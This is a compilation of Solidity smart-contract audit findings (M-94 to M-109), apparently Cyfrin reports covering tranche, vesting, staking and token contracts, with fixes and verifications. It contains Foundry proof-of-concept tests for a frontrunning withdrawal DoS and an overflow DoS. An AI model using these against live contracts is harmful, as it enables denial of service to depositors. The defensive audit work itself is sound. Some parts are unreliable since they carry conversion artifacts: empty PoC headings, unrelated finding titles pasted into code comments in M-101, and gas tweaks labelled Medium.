It is more optimal to use `msg.sender` than having the execution go through the `ERC2771ContextUpgradeable._msgSender()` because the `TrustedForwarder` won't be the `YieldDistributor`, the issuer makes a direct call to the `YieldDistributor`.

```solidity
    modifier isIssuer() {
        AssetDefinition memory AssetData = registry.fetchAssetData(assetID);
@>      if (!AssetData.isIssuer(_msgSender()))
            revert STBL_Asset_InvalidIssuer(assetID);
        _;
    }


    function _msgSender()
        internal
        view
        override(ERC2771ContextUpgradeable)
        returns (address)
    {
@>      return ERC2771ContextUpgradeable._msgSender();
    }

```

The same applies for `distributeReward()`:
```solidity
    function distributeReward(uint256 reward) external {
        ...
@>      if (!AssetData.isVault(_msgSender()))
            revert STBL_Asset_InvalidVault(assetID);
        ...
        IERC20(AssetData.token).safeTransferFrom(
@>          _msgSender(),
            address(this),
            reward
        );
        ...
    }

```

**Recommended Mitigation:** Consider using `msg.sender` instead of calling `_msgSender()`

**STBL:** Fixed in commit [c540943](https://github.com/USD-Pi-Protocol/contract/commit/c54094363b196b534c9c36d563851dff31fe2975)

**Cyfrin:** Verified.


\clearpage

## [M-94] `StakingVault::distributeYield` should revert when there are no vault shares
- Severity: `Medium`
- Source report: `syntetika.md`

### Detailed Content (from source)
**Description:** `StakingVault::distributeYield` should revert when there are no vault shares, and in the updated code when the vault shares are only `DEAD_SHARES`. This could be elegantly implemented as:
```diff
    function distributeYield(
        uint256 yieldAmount,
        uint256 timestamp
    ) external onlyOwner {
+       require(totalSupply() > DEAD_SHARES, NoStakers());
```

**Syntetika:**
Fixed in commit [1b9d7f8](https://github.com/SyntetikaLabs/monorepo/commit/1b9d7f8968be39a815ced0d1545d9aec54530413).

**Cyfrin:** Verified.

## [M-95] Unbounded `depositAddresses` can cause `CompliantDepositRegistry::challengeLatestBatch` to revert due to out of gas
- Severity: `Medium`
- Source report: `syntetika.md`

### Detailed Content (from source)
**Description:** `CompliantDepositRegistry::challengeLatestBatch` contains an unbounded loop that removes deposit addresses from the latest batch by calling `depositAddresses.pop()` repeatedly. When a large batch of deposit addresses is added via `CompliantDepositRegistry::addDepositAddresses`, challenging this batch could consume excessive gas, potentially exceeding the block gas limit and causing the transaction to revert. This creates a Denial of Service (DoS) vulnerability where legitimate challenges cannot be executed.

```solidity
function challengeLatestBatch() public onlyRole(CANCELER_ROLE) {
        require(latestBatchUnlockTime >= block.timestamp, NoChallengeAfterUnlock());

        uint256 _finalizedAddressesLength = finalizedAddressesLength;
        // Get rid of the challenged batch by removing it from the list
        uint256 batchLength = depositAddresses.length - _finalizedAddressesLength;
        for (uint256 i; i < batchLength; i++) {
            depositAddresses.pop();
        }<---------

        // Reset the challenge period to allow a new batch to be generated
        latestBatchUnlockTime = block.timestamp;

        emit BatchChallenged(_finalizedAddressesLength, block.timestamp, batchLength);
    }

```

**Impact:** Large batches become unchallengeable, allowing malicious or incorrect deposit addresses to be finalized.

**Proof of Concept:** **Recommended Mitigation:**
Implement limits on the amount of addresses that can be added through  `CompliantDepositRegistry::addDepositAddresses`.

**Syntetika:**
Fixed in commit [319e7ea](https://github.com/SyntetikaLabs/monorepo/commit/319e7ead926e9973e1257337893c031522506bab) by changing `challengeLatestBatch` to allow cancelling in batches.

**Cyfrin:** Verified.

## [M-96] `Tranche::maxMint` for Junior Tranches is at risk of overflow when the `jrNav` falls below `1:1` rate to `JR_Shares`
- Severity: `Medium`
- Source report: `tranches.md`

### Detailed Content (from source)
**Description:** Given that the system is composed of two tranches (Senior and Junior), and all the assets deposited among the two Tranches are polled together on the Strategy, the actual `totalAssets()` for each Tranche is calculated using the corresponding NAVs (`srtNav` and `jrtNav`).
The Junior Tranche has the peculiarity that can be used to:
1. Fund the Senior's target APR when the generated APR is not enough.
2. Cover losses by taking the hit first and covering as much as possible to limit/reduce the loss for the Seniors.

Any of the above two events results in a decrease in the `jrtNav`, which is translated into the `totalAssets()` for the Junior Tranche being decremented. As a result, the JR Shares to assets decrements and can cause the `share<=>assets` rate to fall below 1:1.

When the `JR_Shares<=>assets` falls below 1:1, `maxMint()` results in overflow because the underlying Math methods implemented for the conversions of shares to assets, and the fact that `assets` to be converted is set as `type(uint256).max`

**Impact:** DoS of `Tranche::mint` because `Tranche::maxMint` reverts due to an overflow when converting shares to assets.

**Proof of Concept:** As demonstrated on the next PoC, when the JR_Shares<=>assets rate falls below 1:1, any calls to `Tranche::maxMint` result in overflow, effectively reverting the tx.

Add the following PoC to `CDO.t.sol` test file:
```solidity
    function test_MaxMintOverflowsInJrTranche() public {
        address alice = makeAddr("Alice");

        uint256 initialDeposit = 1000 ether;
        USDe.mint(alice, initialDeposit);

        vm.startPrank(alice);
        USDe.approve(address(jrtVault), type(uint256).max);
        jrtVault.deposit(initialDeposit, alice);
        vm.stopPrank();

//@audit-info => Simulate 10% losses on the Jr Strategy
//@audit => This would be akin to JR Tranche covering losses or making Senior's APR whole.
        vm.prank(address(sUSDeStrategy));
        sUSDe.transfer(alice, initialDeposit / 10);

        vm.expectRevert();
        jrtVault.maxMint(alice);
    }
```

**Recommended Mitigation:** Given that the max deposits for the Jr Tranche are unlimited, it's okay to return an unlimited max shares too.
- Skip the convertion of assets to shares when `CDO::maxDeposit` returns `type(uint256).max` and instead return the same value.

```diff
// Tranche::maxMint //

    function maxMint(address owner) public view override returns (uint256) {
        uint256 assets = cdo.maxDeposit(address(this));
+       if (assets == type(uint256).max) {
+          return type(uint256).max;
+       }
        return convertToShares(assets);
    }


```

**Strata:**
Fixed in commit [5748b2f](https://github.com/Strata-Money/contracts-tranches/commit/5748b2f292ae3f56335361633d77c9bb30e4d7fa) by not converting `type(uint256).max` onto shares and instead returning that value as max shares to mint for JR Tranche.

**Cyfrin:** Verified.

\clearpage

## [M-97] Frontrunning to Block Junior Tranche Withdrawals
- Severity: `Medium`
- Source report: `tranches.md`

### Detailed Content (from source)
**Description:** In `Accounting.sol`, the junior tranche's `maxWithdraw` is capped to ensure the post-withdrawal Junior NAV (`jrtNav`) remains at least `srtNav * minimumJrtSrtRatio / 1e18` (default 5%). This check uses the current (post-any-updates) NAVs from storage and is called during withdrawals in `Tranche.sol` (via `withdraw` function).

An attacker can frontrun a victim's junior withdrawal transaction in the mempool:
- The attacker deposits a calculated amount into the senior tranche (SRT), inflating `srtNav` via `updateBalanceFlow` (called internally during deposit).
- This raises the `minJrt` threshold, causing the victim's withdrawal to fail the `maxWithdraw` check and revert.

It is not neccessary to deposit max amount just need to deposit enough to make this condition revert
```solidity
uint256 maxAssets = maxWithdraw(owner);
if (baseAssets > maxAssets) {
            revert ERC4626ExceededMaxWithdraw(owner, baseAssets, maxAssets);
        }
```
**Impact:**
- **DoS for Withdrawals**: Victims' legitimate junior withdrawals are blocked, trapping liquidity. In the PoC, a 40e18 withdrawal fails after the attack inflates `srtNav`, setting max to 0.

**Proof of Concept:** The following Foundry test (`test_FrontrunJRTWithdrawal` from `test/CDO.t.sol`)

```solidity
function test_FrontrunJRTWithdrawal() public {
    // Setup initial state: Mint and deposit to JRT and SRT
    address victim = address(0x1234);
    address attacker = address(0x5678);
    address initialDepositor = address(0x9999);

    uint256 initialJRTDeposit = 100 ether; // jrtNav ≈ 100 ether
    uint256 initialSRTDeposit = 1000 ether; // srtNav ≈ 1000 ether
    uint256 victimWithdrawalAmount = 40 ether; // Should be valid pre-attack
    uint256 attackDepositAmount = 1000 ether; // Enough to push JRT maxWithdraw to 0

    // Victim deposits to JRT
    vm.startPrank(victim);
    USDe.mint(victim, initialJRTDeposit);
    USDe.approve(address(jrtVault), initialJRTDeposit);
    jrtVault.deposit(initialJRTDeposit, victim);
    vm.stopPrank();

    // Initial depositor to SRT (could be anyone)
    vm.startPrank(initialDepositor);
    USDe.mint(initialDepositor, initialSRTDeposit);
    USDe.approve(address(srtVault), initialSRTDeposit);
    srtVault.deposit(initialSRTDeposit, initialDepositor);
    vm.stopPrank();

    // Verify initial state: JRT maxWithdraw should allow the withdrawal
    uint256 preMaxWithdraw = accounting.maxWithdraw(true); // isJrt=true
    assertGt(preMaxWithdraw, victimWithdrawalAmount, "Initial maxWithdraw too low");

    // Simulate attacker frontrunning with large SRT deposit
    vm.startPrank(attacker);
    USDe.mint(attacker, attackDepositAmount);
    USDe.approve(address(srtVault), attackDepositAmount);
    srtVault.deposit(attackDepositAmount, attacker);
    vm.stopPrank();

    // Now simulate victim's withdrawal attempt (should fail due to updated cap)
    vm.startPrank(victim);
    vm.expectRevert(
        abi.encodeWithSelector(
            ERC4626ExceededMaxWithdraw.selector,
            victim,
            victimWithdrawalAmount,
            0 // Post-attack maxWithdraw should be 0
        )
    );
    jrtVault.withdraw(victimWithdrawalAmount, victim, victim);
    vm.stopPrank();

    // Verify post-attack state
    uint256 postMaxWithdraw = accounting.maxWithdraw(true);
    assertEq(postMaxWithdraw, 0, "Post-attack maxWithdraw not zeroed");
}
```

**Steps to Reproduce**:
1. Run the test in Foundry: `forge test --match-test test_FrontrunJRTWithdrawal`.

**Strata:**
Fixed in commit [23777d](https://github.com/Strata-Money/contracts-tranches/commit/23777d58ff5aa3c2dcb640d21902aa53e5d29212) by implementing a soft limit for SRTranche deposits to prevent reaching `minimumJrtSrtRatio` by incrementing the SR deposits.

**Cyfrin:** Verified.

## [M-98] Inconsistent APR boundary validation between `AprPairFeed` and `Accounting`
- Severity: `Medium`
- Source report: `tranches.md`

### Detailed Content (from source)
**Description:** There is a mismatch between APR boundary validation constants in `AprPairFeed` and `Accounting` contracts. The `AprPairFeed` accepts negative APRs down to -50%, but the `Accounting` contract rejects any negative APR values, thus data deemed valid by the oracle is rejected during normalization.

```solidity

// AprPairFeed
int64 private constant APR_BOUNDARY_MAX =    2e12; // 200%
int64 private constant APR_BOUNDARY_MIN = -0.5e12; // -50%

     /// @dev Validates that the given APR is within acceptable bounds
    function ensureValid(int64 answer) internal pure {
        require(
            APR_BOUNDARY_MIN <= answer && answer <= APR_BOUNDARY_MAX,
            "INVALID_APR"
        );


// Accounting
int64   private constant APR_BOUNDARY_MAX = 200e12;
int64   private constant APR_BOUNDARY_MIN = 0;

    function normalizeAprFromFeed (/* SD7x12 */ int64 apr) internal pure returns (UD60x18) {
        require(
            APR_BOUNDARY_MIN <= apr && apr <= APR_BOUNDARY_MAX,
            "invalid apr"
        );
```

**Impact:** Protocol DoS: When the feed contains valid negative APR data (between -50% and 0%), the Accounting.normalizeAprFromFeed() function will revert, preventing:

- APR updates via `updateAprs()`;
- Index calculations in `updateIndexes()`;
- Proper accounting updates during deposit/withdrawal flows;

**Recommended Mitigation:** Align the two contracts:

```diff
// Accounting.sol
- int64   private constant APR_BOUNDARY_MIN = 0;
+ int64   private constant APR_BOUNDARY_MIN = -0.5e12; // -50%
```

**Strata:**
Fixed in commit [c80308](https://github.com/Strata-Money/contracts-tranches/commit/c803089861f92533468ee5a31852e7cebaf49e8f) by enforcing APR range on the `Accounting` to not be negative, instead, negative APRs reported from the feed will be considered, Seniors won't have negative APRs.

**Cyfrin:** Verified.

## [M-99] Inconsistent Risk Premium Validation in `Accounting` Allows Future Underflows or Zero APR
- Severity: `Medium`
- Source report: `tranches.md`

### Detailed Content (from source)
**Description:** `Accounting::calculateRiskPremium` computes `risk = riskX + riskY * pow(tvlRatio, riskK)`.
 `Accounting::setRiskParameters` checks that `risk < 1e18` (i.e., less than 100%) immediately after updating the parameters, using the current TVL. However, TVL can change later, so `risk` may become `>= 1e18`. In `Accounting::updateIndexes`, the expression `UD60x18.wrap(1e18) - risk` will yield `0` if `risk == 1e18` (making `aprSrt1` zero) and will revert due to underflow if `risk > 1e18`. This creates an inconsistency between the functions and can produce unintended zeros or reverts at runtime.


**Impact:**
- If `risk > 1e18` after TVL changes, `Accounting::updateIndexes` reverts on underflow, blocking accounting updates, tranche deposits/withdrawals, and NAV calculations.
- If `risk == 1e18`, `aprSrt1` becomes zero, potentially setting senior APR (`aprSrt`) to low values, leading to incorrect NAV splits and no yield for seniors.

**Recommended Mitigation:** In `Accounting::updateIndexes`, cap `risk` or revert explicitly if `risk >= 1e18`.


**Strata:**
Fixed in commit [151661](https://github.com/Strata-Money/contracts-tranches/commit/15166175a98837a26cb2d7fa818504fe21a2e788#diff-a2568622a4f3086b894ddad2f673e1f98ab5cf2f6ab7110ac3bb75fa0331b1f4R376-R379) by calculating risk with the maximum TVLsrt ratio: 1 instead of using the current TVLsrt.

**Cyfrin:** Verified.

## [M-100] Reducing reserves requesting `USDe` as the asset to receive causes the Strategy to release more `sUSDe` than necessary
- Severity: `Medium`
- Source report: `tranches.md`

### Detailed Content (from source)
**Description:** When reducing reserves and asking for `USDe`, the Strategy incorrectly transfers sUSDe for the actual amount of asked `USDe` (`tokenAmount`) instead of only transferring the required `sUSDe` to cover the requested `tokenAmount` of `USDe`.

```solidity
//sUSDeStrategy::reduceReserve()//
    function reduceReserve (address token, uint256 tokenAmount, address receiver) external onlyCDO {
        ...
        if (token == address(USDe)) {
            //@audit-issue => transfer sUSDe for `tokenAmount` which is in USDe.
            unstakeCooldown.transfer(sUSDe, receiver, tokenAmount);
            return;
        }
        revert UnsupportedToken(token);
    }
```

**Impact:** The strategy releases more sUSDe than necessary to cover the USDe requested to be withdrawn when reducing reserves and asking USDe. This means that depositors end up incurring a loss because the strategy is left with less USDe than it should have.

**Proof of Concept:** For example, if the `sUSDe` <=> `USDe` rate is 1:1.5, and it is requested to reduce reserves for 150 USDe.
- The Strategy will send 150 `sUSDe` (which are worth `225 USDe`) to the `treasury` **instead of only sending** `100 sUSDe` (worth `150 USDe`).


**Recommended Mitigation:** When reducing reserves asking for USDe, on `sUSDeStrategy::reduceReserve`, call `sUSDe::previewWithdraw` to get how much sUSDe is required to obtain the requested `tokenAmount` of `USDe`, and transfer that amount of `sUSDe` to the `UnstakeCooldown` contract.
```solidity
    function reduceReserve (address token, uint256 tokenAmount, address receiver) external onlyCDO {
       ...
        if (token == address(USDe)) {
+           uint256 shares = sUSDe.previewWithdraw(tokenAmount);
+           unstakeCooldown.transfer(sUSDe, receiver, shares);
-           unstakeCooldown.transfer(sUSDe, receiver, tokenAmount);
            return;
        }
        revert UnsupportedToken(token);
    }
```

**Strata:**
Fixed in commit [953c3bc](https://github.com/Strata-Money/contracts-tranches/commit/953c3bc8ee4b5aaca955eabb07ab1c5e62c28166) by converting `tokenAmount` to `shares` in `sUSDe` units.

**Cyfrin:** Verified.

## [M-101] When Senior's TargetGain is negative, the tx will revert because the senior loss is not accounted for on the Junior Tranche as profit, causing the navs summation to not match the current nav
- Severity: `Medium`
- Source report: `tranches.md`

### Detailed Content (from source)
**Description:** When `srtGainTarget < 0`, the code transfers senior loss to `jrtNavT0` *after* initializing `jrtNavT1 = jrtNavT0 + gain_dTAbs`. This fails to propagate the junior "profit" to `jrtNavT1`, leaving it unchanged.

```solidity
 if (srtGainTarget < 0) {
            // Should never happen, jic: transfer the loss to Juniors as profit
            uint256 loss = uint256(-srtGainTarget);
            uint256 srtLoss = Math.min(srtNavT0, loss);

            srtNavT0 -= srtLoss;
//@audit-issue => Updates jrtNavT0 instead of T1
@>          jrtNavT0 += srtLoss;
            srtGainTarget = 0;
        }
        uint256 srtGainTargetAbs = Math.min(
            uint256(srtGainTarget),
            Math.saturatingSub(jrtNavT1, 1e18)
        );

          // [*Users can get their withdrawal active requests DoSed by malicious users*](#users-can-get-their-withdrawal-active-requests-dosed-by-malicious-users) Final new Jrt
        jrtNavT1 = jrtNavT1 - srtGainTargetAbs;
        // [*Withdrawers of `sUSDe` always incur a loss because parameters passed from `Tranche::_withdraw` to `CDO::withdraw` are inverted*](#withdrawers-of-susde-always-incur-a-loss-because-parameters-passed-from-tranchewithdraw-to-cdowithdraw-are-inverted) Final new Srt
        srtNavT1 = srtNavT0 + srtGainTargetAbs;

//@audit-issue => sum of navs won't match because the senior loss is missing on jrtNavT1
        if (navT1 != (jrtNavT1 + srtNavT1 + reserveNavT1)) {
            revert InvalidNavSpit(navT1, jrtNavT1, srtNavT1, reserveNavT1);
        }
```
**Impact:** Tx will revert with error `InvalidNavSpit()` because the `srtGainTarget` was discounted from `srtNavT0` but was not accounted on `jrtNavT1`

**Proof of Concept:** **Recommended Mitigation:**
Make sure to update `jrtNavT1` instead of T0.
```diff
 if (srtGainTarget < 0) {
            // Should never happen, jic: transfer the loss to Juniors as profit
            uint256 loss = uint256(-srtGainTarget);
            uint256 srtLoss = Math.min(srtNavT0, loss);

            srtNavT0 -= srtLoss;
-           jrtNavT0 += srtLoss;
+           jrtNavT1 += srtLoss;
            srtGainTarget = 0;
        }
        ...
```

**Strata:**
Fixed in commit [5332b3](https://github.com/Strata-Money/contracts-tranches/commit/5332b383b10d1762d0413d98c3b62c1e720ac051) by updating the correct variable `jrtNavT1` instead of `jrtNavT0`

**Cyfrin:** Verified.

## [M-102] `SDLVesting::stakeReleasableTokens` gas optimization by caching variables
- Severity: `Medium`
- Source report: `vesting.md`

### Detailed Content (from source)
**Description:**
```solidity
    function stakeReleasableTokens() external {
        uint256 amount = releasable();
        if (amount == 0) revert NoTokensReleasable();

        released += amount;
        sdlToken.transferAndCall(
            address(sdlPool),
            amount,
            abi.encode(reSDLTokenIds[lockTime], lockTime * (365 days))
        );

        if (reSDLTokenIds[lockTime] == 0) {
            reSDLTokenIds[lockTime] = sdlPool.lastLockId();
        }

        emit Staked(amount);
    }
```

Currently `lockTime` and `reSDLTokenIds[lockTime]` are read from storage for multiple times. Both variables should be cached to save gas:

```diff
    function stakeReleasableTokens() external {
        uint256 amount = releasable();
        if (amount == 0) revert NoTokensReleasable();

        released += amount;
-       sdlToken.transferAndCall(
-           address(sdlPool),
-           amount,
-           abi.encode(reSDLTokenIds[lockTime], lockTime * (365 days))
-       );
-
-       if (reSDLTokenIds[lockTime] == 0) {
-           reSDLTokenIds[lockTime] = sdlPool.lastLockId();
-       }

+       uint64 cachedLockTime = lockTime;
+       uint256 cachedTokenId = reSDLTokenIds[cachedLockTime];
+
+       sdlToken.transferAndCall(
+          address(sdlPool),
+          amount,
+         abi.encode(cachedTokenId, cachedLockTime * (365 days))
+      );
+
+      if (cachedTokenId == 0) {
+          reSDLTokenIds[cachedLockTime] = sdlPool.lastLockId();
+      }

       emit Staked(amount);
    }
```

**Stake.Link:** Fixed in commit [`128c335`](https://github.com/stakedotlink/contracts/commit/128c33560d8f43057c5d10d822b4904d0762d0fd)

**Cyfrin:** Verified. `tokenId` now cached.

## [M-103] `SDLVesting::withdrawRESDLPositions` enhancements
- Severity: `Medium`
- Source report: `vesting.md`

### Detailed Content (from source)
**Description:** The `SDLVesting::withdrawRESDLPositions()` function violates the Checks-Effects-Interactions (CEI) pattern by performing external calls before updating state. The function also lacks input validation for lock times and may attempt to transfer non-existent token IDs, causing transaction reverts and poor user experience.

While not exploitable due to SDLPool's ownership checks, the function updates state after external calls, creating a potential reentrancy vector as well as bad user experience in case of incorrect input.

Consider adding validation for `_lockTimes` and move the state changes before the external call:

```diff
    function withdrawRESDLPositions(uint256[] calldata _lockTimes) external onlyBeneficiary {
        for (uint256 i = 0; i < _lockTimes.length; ++i) {

-            sdlPool.safeTransferFrom(address(this), beneficiary, reSDLTokenIds[_lockTimes[i]]);
-            delete reSDLTokenIds[_lockTimes[i]];

+            if (_lockTimes[i] > MAX_LOCK_TIME) revert InvalidLockTime();
+            uint256 tokenId = reSDLTokenIds[_lockTimes[i]]; // Cache to facilitate the deletion before transfer
+            if (tokenId == 0) continue; // Skip if no reSDL position exists so we don't break execution but also don't attempt to transfer 0.
+            delete reSDLTokenIds[_lockTimes[i]];
+            sdlPool.safeTransferFrom(address(this), beneficiary, tokenId);
        }
    }
```

**Stake.Link:** Fixed in commit [`e458512`](https://github.com/stakedotlink/contracts/commit/e4585124c05137848196d4ca759c3e9d28b963e1)

**Cyfrin:** Verified. `_lockTime[i]` now verified to not be larger than `MAX_LOCK_TIME` and delete is done before call to `safeTransfer`.

## [M-104] Lack of `_lockTime` validation in `constructor`
- Severity: `Medium`
- Source report: `vesting.md`

### Detailed Content (from source)
**Description:** The constructor assigns `lockTime = _lockTime` without checking `_lockTime <= MAX_LOCK_TIME`. If an out‑of‑range value is provided, any subsequent call that indexes `reSDLTokenIds[lockTime]` (e.g. in `stakeReleasableTokens` or `withdrawRESDLPositions`) will revert with an array‑bounds error.

Consider adding an explicit check in the constructor to improve UX and fail fast:

```solidity
require(_lockTime <= MAX_LOCK_TIME, "Invalid lock time");
```


**Stake.Link:** Fixed in commit [`e458512`](https://github.com/stakedotlink/contracts/commit/e4585124c05137848196d4ca759c3e9d28b963e1)

**Cyfrin:** Verified. `_lockTime` now required to not be larger than `MAX_LOCK_TIME`.

## [M-105] Zero‑Duration vesting edge case
- Severity: `Medium`
- Source report: `vesting.md`

### Detailed Content (from source)
**Description:** When `duration == 0`, calling `vestedAmount(start)` falls through the `else if (_timestamp > start + duration)` check (because `start > start` is false) into the linear‑vest branch, executing

```solidity
(totalAllocation * (start - start)) / duration
```

This creates a brief one‑second revert window at exactly `start`. Since any later timestamp (`> start`) correctly returns full allocation.

Consider changing the comparison to `>=`:
```diff
- else if (_timestamp > start + duration) {
+ else if (_timestamp >= start + duration) {
    return totalAllocation;
}
```

so that `start + duration` (even when zero) immediately yields the “fully vested” branch.

**Stake.Link:** Fixed in commit [`e458512`](https://github.com/stakedotlink/contracts/commit/e4585124c05137848196d4ca759c3e9d28b963e1)

**Cyfrin:** Verified. Comparison is not `>=`.

## [M-106] `BetFactory::setPool` should validate input pool is legitimate AaveV3 pool and supports input token
- Severity: `Medium`
- Source report: `wannabetv2.md`

### Detailed Content (from source)
**Description:** `BetFactory::setPool` should validate input pool is legitimate AaveV3 pool and supports input token. This can be done by:

1) `BetFactory::constructor` should take as input the address of AaveV3 deployed `PoolAddressesProvider` contract and store it into an immutable variable `AAVE_ADDRESSES_PROVIDER`; on Base mainnet this is `0xe20fCBdBfFC4Dd138cE8b2E6FBb6CB49777ad64D`

2) `BetFactory::setPool` should verify that input `_pool` matches `PoolAddressesProvider::getPool`

3) `BetFactory::setPool` should verify that input `_token` is an associated underlying token of the pool by calling `Pool::getReserveAToken` and ensuring the return value is not `address(0)`

4) optionally also verify via `IAToken::UNDERLYING_ASSET_ADDRESS`

**Recommended Mitigation:** A potential solution which appears to work with the existing test suite, and also resolves finding M-3:

1) first add these additional includes to `BetFactory.sol`:
```solidity
import {IPool} from "@aave-dao/aave-v3-origin/src/contracts/interfaces/IPool.sol";
import {IAToken} from "@aave-dao/aave-v3-origin/src/contracts/interfaces/IAToken.sol";
import {IPoolAddressesProvider} from "@aave-dao/aave-v3-origin/src/contracts/interfaces/IPoolAddressesProvider.sol";
```

2) Inside `BetFactory`, define this constant and three new errors:
```solidity
contract BetFactory is Ownable {
    // Base mainnet Aave V3 PoolAddressesProvider
    IPoolAddressesProvider public constant AAVE_ADDRESSES_PROVIDER =
        IPoolAddressesProvider(0xe20fCBdBfFC4Dd138cE8b2E6FBb6CB49777ad64D);

    error InvalidPool();
    error TokenNotSupported();
    error ATokenMismatch();
```

3) Use this new version for `BetFactory::setPool`:
```solidity
    function setPool(address _token, address _pool) external onlyOwner {
        // Allow setting to zero (disable Aave for this token)
        if (_pool == address(0)) {
            tokenToPool[_token] = address(0);
            emit PoolConfigured(_token, address(0));
            return;
        }

        // Validate against canonical registry
        if (_pool != AAVE_ADDRESSES_PROVIDER.getPool()) {
            revert InvalidPool();
        }

        // Verify token is listed
        address aToken = IPool(_pool).getReserveAToken(_token);
        if (aToken == address(0)) {
            revert TokenNotSupported();
        }

        // Verify bidirectional relationship
        if (IAToken(aToken).UNDERLYING_ASSET_ADDRESS() != _token) {
            revert ATokenMismatch();
        }

        tokenToPool[_token] = _pool;
        emit PoolConfigured(_token, _pool);
    }
```

**WannaBet:** Fixed in commit [70e1565](https://github.com/gskril/wannabet-v2/commit/70e1565b391992b7ea8b11f2cc59195478a69212).

**Cyfrin:** Verified.

## [M-107] Missing zero address validation for authorized signer in `WorldLibertyFinancialV2.initialize()`
- Severity: `Medium`
- Source report: `wlf.md`

### Detailed Content (from source)
**Description:** The `WorldLibertyFinancialV2::initialize()` function does not validate that the `_authorizedSigner` parameter is not the zero address.

This parameter is critical for the activateAccount() function, which allows legacy users to self-activate their accounts.

```solidity
function initialize(address _authorizedSigner) external reinitializer(/* version = */ 2) {
    __EIP712_init(name(), "2");

    V2 storage $ = _getStorage();
    _ownerSetAuthorizedSigner($, _authorizedSigner); // @audit No zero address validation
}
```

Same issue also exists in the `ownerSetAuthorizedSigner`

**Impact:** The `activateAccount()` function will always revert with `InvalidSignature()` since `ECDSA.recover()` never returns the zero address for valid signatures


**Recommended Mitigation:** Consider adding a zero address validation in the `initialize()` function


**WLFI:**
Fixed in commit [b567696](https://github.com/worldliberty/usd1-protocol/blob/b56769613b6438b62b8b4133a63fca727fdbc631/contracts/wlfi/WorldLibertyFinancialV2.sol#L410)

**Cyfrin:** Verified.

## [M-108] WLFI owner can DoS legacy users through direct vester activation
- Severity: `Medium`
- Source report: `wlf.md`

### Detailed Content (from source)
**Description:** The `WorldLibertyFinancialVester::ownerActivateVest` function can be used to bypass the normal activation flow, potentially causing a denial-of-service for legacy users. When the owner directly activates a user in the vester with incorrect parameters, the user is unable to complete their normal activation flow and gets stuck with wrong vesting parameters.

The contract has two independent activation paths that don't coordinate with each other:

Normal path: `WLFI V2 → Registry::wlfiActivateAccount → Vester::wlfiActivateVest` (coordinated, uses registry data for allocation and category)
Bypass path: `Owner → Vester::ownerActivateVest` (direct, uses owner-specified parameters as inputs)

The vester contract prevents double initialization but doesn't validate parameter consistency between paths.

Here is a normal activation

```solidity
// WorldLibertyFinancialV2.sol
function _activateAccount(address _account) internal {
    REGISTRY.wlfiActivateAccount(_account);                    // @note -> Mark as activated in registry
    uint8 category = REGISTRY.getLegacyUserCategory(_account);
    uint112 allocation = REGISTRY.getLegacyUserAllocation(_account);

    _approve(_account, address(VESTER), 0);
    _approve(_account, address(VESTER), allocation);           // @note -> Set allowance

    VESTER.wlfiActivateVest(_account, category, allocation);   // @note -> Activate vesting
    assert(allowance(_account, address(VESTER)) == 0);
}
```

Here is a bypassed vesting route:

```solidity
// WorldLibertyFinancialVester.sol
function ownerActivateVest(address _user, uint8 _category, uint112 _amount)
    external
    onlyWorldLibertyOwner(msg.sender)
{
    _activateVest(_user, _category, _amount);  // @audit No coordination with Registry/WLFI V2
    // @audit any amount that is approved by user can be taken -> not registry allocation
   // @audit vesting can be in any category -> not necessarily category in registry
}

function _activateVest(address _user, uint8 _category, uint112 _amount) internal {
    UserInfo storage userInfo = $.users[_user];
    if (userInfo.initialized) {
        revert AlreadyInitialized(_user);      // @audit if user tries to activate later, he will be DOS'ed here     }
    // ... activation logic
}
```

**Impact:** Owner actions can cause denial of service for legacy user activation. Legacy users get stuck with incorrect vesting parameters and cannot self-correct

**Recommended Mitigation:** Consider validating vesting parameters and activating legacy user, if not activated.

```solidity
function ownerActivateVest(address _user, uint8 _category, uint112 _amount) external {
    // For legacy users: validate parameters and sync registry
    if (REGISTRY.isLegacyUser(_user)) {
        // @audit Validate parameters match registry data
        require(_category == REGISTRY.getLegacyUserCategory(_user), "CATEGORY_MISMATCH");
        require(_amount == REGISTRY.getLegacyUserAllocation(_user), "ALLOCATION_MISMATCH");

        // @audit Auto-sync registry state to maintain consistency
        if (!REGISTRY.isLegacyUserAndIsActivated(_user)) {
            REGISTRY.ownerActivateAccount(_user);
        }
    }

    _activateVest(_user, _category, _amount);
}
```

**WLFI:**
Fixed in commit [b567696](https://github.com/worldliberty/usd1-protocol/blob/b56769613b6438b62b8b4133a63fca727fdbc631/contracts/wlfi/WorldLibertyFinancialV2.sol#L314)

**Cyfrin:** Verified. `ownerActivateVest` is removed.

## [M-109] `Manager::_transferFee` returns invalid `feeShares` when `fee` is zero
- Severity: `Medium`
- Source report: `yieldfi.md`

### Detailed Content (from source)
**Description:** When a user deposits directly into `Manager::deposit`, the protocol fee is calculated via the [`Manager::_transferFee`](https://github.com/YieldFiLabs/contracts/blob/40caad6c60625d750cc5c3a5a7df92b96a93a2fb/contracts/core/Manager.sol#L226-L242) function:

```solidity
function _transferFee(address _yToken, uint256 _shares, uint256 _fee) internal returns (uint256) {
    if (_fee == 0) {
        return _shares;
    }
    uint256 feeShares = (_shares * _fee) / Constants.HUNDRED_PERCENT;

    IERC20(_yToken).safeTransfer(treasury, feeShares);

    return feeShares;
}
```

The issue is that when `_fee == 0`, the function returns the full `_shares` amount instead of returning `0`. This leads to incorrect logic downstream in [`Manager::_deposit`](https://github.com/YieldFiLabs/contracts/blob/40caad6c60625d750cc5c3a5a7df92b96a93a2fb/contracts/core/Manager.sol#L286-L296), where the result is subtracted from the total shares:

```solidity
// transfer fee to treasury, already applied on adjustedShares
uint256 adjustedFeeShares = _transferFee(order.yToken, adjustedShares, _fee);

// Calculate adjusted gas fee shares
uint256 adjustedGasFeeShares = (_gasFeeShares * order.exchangeRateInUnderlying) / currentExchangeRate;

// transfer gas to caller
IERC20(order.yToken).safeTransfer(_caller, adjustedGasFeeShares);

// remaining shares after gas fee
uint256 sharesAfterAllFee = adjustedShares - adjustedFeeShares - adjustedGasFeeShares;
```

If `_fee == 0`, the `adjustedFeeShares` value will incorrectly equal `adjustedShares`, causing `sharesAfterAllFee` to underflow (revert), assuming `adjustedGasFeeShares` is non-zero.

**Impact:** Deposits into the `Manager` contract with a fee of zero will revert if any gas fee is also deducted. In the best-case scenario, the deposit fails. In the worst case—if the subtraction somehow passes unchecked—it could result in zero shares being credited to the user.

**Recommended Mitigation:** Update `_transferFee` to return `0` when `_fee == 0`, to ensure downstream calculations behave correctly:

```diff
  if (_fee == 0) {
-     return _shares;
+     return 0;
  }
```

